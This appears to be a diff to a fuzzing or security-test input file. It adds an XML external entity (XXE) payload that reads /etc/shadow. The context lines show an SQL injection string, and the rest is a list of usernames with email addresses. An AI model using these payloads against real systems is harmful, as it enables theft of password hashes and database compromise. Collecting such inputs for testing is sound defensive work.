@@ -18,6 +18,12 @@ tower' or 0=0 ;--
 Hello &t3;
 </foo>
 
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+<foo>&xxe;</foo>
+
 freestar rockxy@telemol.club
 boyscoutscattle havenlaw@foohurfe.com 
 lovesickmany holski@chillphet.com
